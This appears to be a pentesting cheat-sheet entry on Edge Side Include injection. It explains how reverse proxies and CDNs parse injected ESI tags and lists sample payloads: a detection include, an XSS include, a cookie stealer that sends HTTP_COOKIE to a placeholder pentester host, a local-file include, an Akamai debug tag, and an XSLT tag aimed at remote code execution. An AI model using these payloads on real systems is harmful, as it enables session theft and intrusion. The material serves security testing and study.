Edge Side Includes (`ESI`) is an XML-based markup language used to tackle performance issues by enabling heavy caching of Web content. This allows for dynamic web content assembly at the edge of the network (CDN, Browser, or Reverse Proxy) by instructing the page processor what needs to be done to complete page assembly through ESI elements (XML tags).

These ESI elements/tags are used to instruct the HTTP surrogates, such as reverse proxy, caching server, to fetch additional information regarding a web page with an already cached template. This information may come from another server before rendering the web page to the end-user.

Edge-Side Include Injection occurs when an attacker manages to reflect malicious ESI tags in the HTTP Response. This vulnerability happens due to HTTP surrogates not able to validate the ESI tag origin. They will gladly parse and evaluate legitimate ESI tags by the upstream server and malicious ESI tags by an attacker.

ESI can be identified by inspecting response headers in search for `Surrogate-Control: content="ESI/1.0"`.

Some useful ESI tags are:
```html
// Basic detection
<esi:include src=http://<PENTESTER IP>>

// XSS Exploitation Example
<esi:include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```

In some cases, SSI injection can be used to achieve remote code execution (RCE), the only pre-requisite is that the application that is processing the ESI directives must support XSLT, a dynamic language used to transform XML files, and that the attacker includes `dca=xslt` in the payload (i.e `<esi:include src="http://<PENTESTER IP>/payload" dca=xslt>`).

Read more about ESI in [GoSecure blog](https://gosecure.ai/blog/2018/04/03/beyond-xss-edge-side-include-injection/).